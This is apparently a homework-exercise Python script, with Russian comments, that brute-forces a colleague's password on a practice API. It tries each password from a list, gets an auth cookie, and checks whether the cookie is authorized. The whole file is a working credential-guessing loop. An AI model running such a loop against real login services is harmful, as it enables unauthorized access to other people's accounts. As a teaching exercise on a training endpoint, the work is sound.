import requests

from Config import URL_SECRET_PASSWORD, URL_CHECK_AUTH, LOGIN, PASSWORD_LIST

# 1. Брать очередной пароль и вместе с логином коллеги вызывать первый метод get_secret_password_homework. 
# В ответ метод будет возвращать авторизационную cookie с именем auth_cookie и каким-то значением.

for password in PASSWORD_LIST:
    payload = {"login": LOGIN, "password": password}
    response = requests.post(URL_SECRET_PASSWORD, data=payload)

    if response.status_code == 200:
        pass
        # print(f"'Secret_password method' response:{response.text}")
    else:
        print(f"'Secret_password method' response failed with status code: {response.text}")
    cookies = response.cookies.get_dict()
    auth_cookie = cookies["auth_cookie"]

    if auth_cookie:
        auth_cookie = cookies["auth_cookie"]
        # print(auth_cookie)
        headers = {"Cookie": "{}={}".format("auth_cookie", auth_cookie)}
    else:
        raise ValueError("Issue with Auth cookie") 
    
#2. Далее эту cookie мы должна передать во второй метод check_auth_cookie. 
# Если в ответ вернулась фраза "You are NOT authorized", значит пароль неправильный. 
# В этом случае берем следующий пароль и все заново. Если же вернулась другая фраза - нужно, 
# чтобы программа вывела верный пароль и эту фразу.

    response = requests.post(URL_CHECK_AUTH, headers = headers)
    if response.status_code == 200:
        print(f"'Check_auth method' response:{response.text}")
    else:
        print(f"'Check_auth method' response failed with status code: {response.text}")
    
    if response.text == "You are authorized":
        print(f"Correct password found: {password}")
        break
    else:
        print(f"Incorrect password: {password}")
    

    

























